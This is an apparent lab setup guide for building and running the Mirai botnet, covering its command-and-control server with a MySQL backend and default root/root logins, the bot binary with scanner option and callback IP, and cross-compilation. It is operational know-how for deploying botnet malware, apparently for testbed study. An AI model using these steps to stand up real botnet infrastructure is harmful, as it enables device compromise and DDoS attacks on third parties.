# Setup Instructions (for x86/x64 bot)

### For NCL
We'll need to update the `sources.list` to get `apt-get` working (only applies to cnc). 

1. go to `/etc/apt`
2. rename `sources.list` to `sources.list.bak`
3. create a new `sources.list` and add the following lines to it
  ```
  ###### Ubuntu Main Repos
  deb http://sg.archive.ubuntu.com/ubuntu/ trusty main restricted universe multiverse 
  deb-src http://sg.archive.ubuntu.com/ubuntu/ trusty main restricted universe multiverse 

  ###### Ubuntu Update Repos
  deb http://sg.archive.ubuntu.com/ubuntu/ trusty-security main restricted universe multiverse 
  deb http://sg.archive.ubuntu.com/ubuntu/ trusty-updates main restricted universe multiverse 
  deb http://sg.archive.ubuntu.com/ubuntu/ trusty-proposed main restricted universe multiverse 
  deb http://sg.archive.ubuntu.com/ubuntu/ trusty-backports main restricted universe multiverse 
  deb-src http://sg.archive.ubuntu.com/ubuntu/ trusty-security main restricted universe multiverse 
  deb-src http://sg.archive.ubuntu.com/ubuntu/ trusty-updates main restricted universe multiverse 
  deb-src http://sg.archive.ubuntu.com/ubuntu/ trusty-proposed main restricted universe multiverse 
  deb-src http://sg.archive.ubuntu.com/ubuntu/ trusty-backports main restricted universe multiverse 
  ```
4. now `apt-get` should work

### Installation Instructions for Running cnc (assumes you have already built it)
1. install mysql: `sudo apt-get install mysql-server mysql-client`
  * make sure you set the root password as `root` during the installation
2. run [scripts/db.sql](scripts/db.sql) in the mysql shell
  ```
  <in the scripts folder>
  $ mysql -u root -p
  <enter password>
  
  source db.sql;
  \q
  ```
3. to make sure you are not kicked out of the session, add these two lines under the `[mysqld]` section in `/etc/mysql/my.cnf` (you will probably need root access)
  ```
  [mysqld]
  
  ...
  
  wait_timeout = 86400
  interactive_timeout = 86400
  ```
4. restart mysql: `sudo service mysql restart`
5. run the cnc: `sudo ./cnc`
6. in order to access the cnc, use `telnet localhost` (assumes you are telnet-ing on the cnc machine)
7. use `username: root` and `password: root` to login (as defined in [scripts/db.sql](scripts/db.sql))
8. refer to [attack-instructions.md](attack-instructions.md) for how to launch an attack

### Instructions for Running bot (assumes you have already built it)
1. run the bot: `sudo ./debug/mirai.dbg <cnc ip> <local ip> <callback ip> <enable scanner 0/1>` (assumes you have built the debug version)
  * e.g. `sudo ./debug/mirai.dbg 10.0.0.1 10.0.0.2 10.0.0.1 0`
  * you can use [mirai/demo-bot.sh](mirai/demo-bot.sh) that automatically finds the ip address of eth0 (be sure to change the hardcoded cnc and callback ip addresses)

### Installation Instructions for Building
1. install golang
  ```
  $ sudo add-apt-repository ppa:ubuntu-lxc/lxd-stable
  $ sudo apt-get update
  $ sudo apt-get install golang
  ```
2. run [scripts/cross-compile.sh](scripts/cross-compile.sh) (needs root)
3. add export paths in `~/.bashrc` (you may need to restart bash after this step)
  ```
  add the following lines:
  export PATH=$PATH:/etc/xcompile/i586/bin
  export PATH=$PATH:/usr/lib/go/bin
  export GOPATH=$HOME/Documents/go
  ```
4. install git: `sudo apt-get install git`
5. install go packages
  * `go get github.com/go-sql-driver/mysql`
  * `go get github.com/mattn/go-shellwords`
6. build using [mirai/build.sh](mirai/build.sh)
  * e.g. `mirai/build.sh debug telnet`
  * only the debug, telnet version has been tested
  * output files will be in the `debug` folder, with `cnc` and `mirai.dbg` (the bot)
